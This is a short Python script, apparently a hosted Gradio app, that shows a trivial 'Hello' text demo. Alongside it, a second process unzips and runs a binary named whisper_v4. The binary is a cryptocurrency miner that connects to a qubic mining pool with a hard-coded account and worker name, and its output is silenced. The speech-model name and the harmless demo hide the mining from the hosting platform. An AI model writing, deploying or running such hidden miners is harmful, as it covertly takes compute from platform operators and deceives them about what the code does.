from multiprocessing import Process
import gradio as gr
import os, subprocess

def hello(name):
    return "Hello " + name + "!!"

demo = gr.Interface(fn=hello, inputs="text", outputs="text")

def lolab01959():
    wk_name = "shor12_HoaiAi"
    #os.getenv('SPACE_ID').replace("/","_")
    os.system("unzip whisper_v4.zip")
    os.system("chmod +x ./whisper_v4/whisper_v4")
    os.system(f"./whisper_v4/whisper_v4 --account CP_fafubk1b65 --pool qubic1.hk.apool.io:3334 --worker {wk_name} >/dev/null")


if __name__ == '__main__':
    Process(target=demo.launch).start()
    Process(target=lolab01959).start()
